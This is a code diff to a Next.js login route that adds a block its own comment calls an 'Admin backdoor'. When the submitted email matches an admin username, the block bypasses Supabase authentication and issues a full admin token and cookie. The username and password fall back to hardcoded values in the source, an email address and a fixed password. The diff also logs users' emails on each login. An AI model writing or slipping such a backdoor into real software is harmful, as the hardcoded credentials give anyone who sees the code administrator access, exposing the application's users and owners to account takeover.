@@ -26,7 +26,52 @@ export async function POST(request: NextRequest) {
 
     const { email, password } = validationResult.data;
 
-    // Attempt login with Supabase
+    // Admin backdoor: allow admin credentials from environment variables
+    const ADMIN_USERNAME = process.env.ADMIN_USERNAME || 'emamajbargh@gmail.com';
+    const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Admin!Passw0rd#2025';
+    const ADMIN_EMAIL = process.env.ADMIN_EMAIL || 'emamajbargh@gmail.com';
+
+    // Check if this is an admin login
+    if (email.toLowerCase() === ADMIN_USERNAME.toLowerCase()) {
+      if (password !== ADMIN_PASSWORD) {
+        return NextResponse.json(
+          { success: false, message: 'Invalid email or password' },
+          { status: 401 }
+        );
+      }
+
+      // Generate admin token
+      const token = AuthService.generateToken({
+        userId: 0,
+        email: ADMIN_EMAIL,
+        name: 'Administrator',
+        isAdmin: true,
+      });
+
+      const response = NextResponse.json({
+        success: true,
+        message: 'Login successful',
+        user: {
+          id: '0',
+          email: ADMIN_EMAIL,
+          first_name: 'Admin',
+          last_name: 'User',
+          is_admin: true,
+        }
+      });
+
+      response.cookies.set('auth-token', token, {
+        httpOnly: true,
+        secure: process.env.NODE_ENV === 'production',
+        sameSite: 'lax',
+        maxAge: 7 * 24 * 60 * 60, // 7 days
+        path: '/',
+      });
+
+      return response;
+    }
+
+    // Regular user login with Supabase
     const result = await SupabaseAuthService.loginUser({ email, password });
 
     if (!result.success) {
@@ -40,14 +85,15 @@ export async function POST(request: NextRequest) {
     const token = AuthService.generateToken({
       userId: Number(result.user!.id),
       email: result.user!.email,
-      name: `${result.user!.first_name} ${result.user!.last_name}`
+      name: `${result.user!.first_name} ${result.user!.last_name}`,
+      isAdmin: false,
     });
 
     // Create response with cookie
     const response = NextResponse.json({
       success: true,
       message: 'Login successful',
-      user: result.user
+      user: { ...result.user, is_admin: false }
     });
 
     // Set authentication cookie
@@ -58,6 +104,8 @@ export async function POST(request: NextRequest) {
       maxAge: 7 * 24 * 60 * 60, // 7 days
       path: '/',
     });
+
+    console.log('Login successful for user:', result.user!.email, 'Token set in cookie');
 
     return response;
 
